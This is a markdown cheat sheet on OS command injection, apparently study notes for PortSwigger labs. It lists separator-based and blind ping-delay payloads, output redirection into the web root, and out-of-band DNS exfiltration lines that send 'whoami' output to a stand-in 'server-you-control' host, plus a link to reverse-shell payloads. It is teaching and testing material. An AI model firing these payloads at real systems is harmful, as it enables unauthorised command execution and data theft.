# Command Injection

## Summary

* [General Recon For Comamnd Injection Vulnerabilities](#recon)
* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

## Resources

* https://portswigger.net/web-security/os-command-injection
* https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection

## Recon

* First step is to perform application mapping and identify any instances where the application appears to be interacting with the underlying OS by calling external processes or accessing the filesystem.  
* The application may issue OS system commands containing any item of user supplied data (every URL, parameters, cookies, etc.).  It’s recommended to probe all these instances for OS Command Injection.

---
---

## Cheat Sheet

### Background Knowledge

* The characters ; | & and newline(URL encoded -> %0a) can be used to batch multiple commands one after another.  Each of these characters should be used when probing for command injection vulnerabilities, as the application may reject some inputs but accept others.

* The backtick \` character can also be used to encapsulate a separate command within a data item being processed by the original command.  This will cause the interpreter to execute this command first before continuing to execute the remaining command String: 

```bash
nslookup `whoami`.server-you-control.net
```

### Example

* Many times the injected characters need to be encoded, since they can interfere with the structure of the URL/body parameters.

  * For example, below the & and {space} characters need to be URL encoded (%26 and %20) in order to be treated as part of the injection payload:

![Command Injection](https://github.com/ChrisM-X/Payloads_Cheat-Sheets/blob/main/Web%20Security%20Payloads/Portswigger%20-%20Web%20Security%20Academy/Command%20Injection/Images/CommandInjection-1.png)

### Simple Command Injection

```bash
& echo test123 &
```

### Blind Command Injection

* Many times, the results of the injected commands are not returned in the application responses.  If that is the case, we can use the ping command to trigger a time delay in the application’s response by causing the server to ping its loopback interface for a specific time period.

* To maximize chances of identifying OS Command Injection if the application is filtering certain command separators, submit each of the following payloads to each input fields and analyze the time taken for the application to respond:

```bash
| ping -i 30 127.0.0.1 |
```

```bash
| ping -n 30 127.0.0.1 |
```

```bash
& ping -i 30 127.0.0.1 &
```

```bash
& ping -n 30 127.0.0.1 &
```

```bash
; ping -i 30 127.0.0.1 ;
```

```bash
%0a ping -i 30 127.0.0.1 %0a
```

```bash
` ping 127.0.0.1 `
```


### Output Redirection

* We can also redirect a commands output to a file using the > character.  The below example redirects the output of the OS command to a file <u>within the web root</u>, then we can access the file to view the contents through our browser.

```bash
; whoami > /var/www/images/test;
```

### Out-of-band channel payloads

#### Network Interaction

```bash
; nslookup server-you-control ;
```

```bash
& nslookup server-you-control &
```

#### Reverse Shells
* https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

#### DNS Data Exfiltration
* Using backticks \`_command_\` and $(_command_)

```bash
; nslookup $(whoami).server-you-control ;
```

```bash
; nslookup `whoami`.server-you-control ;
```
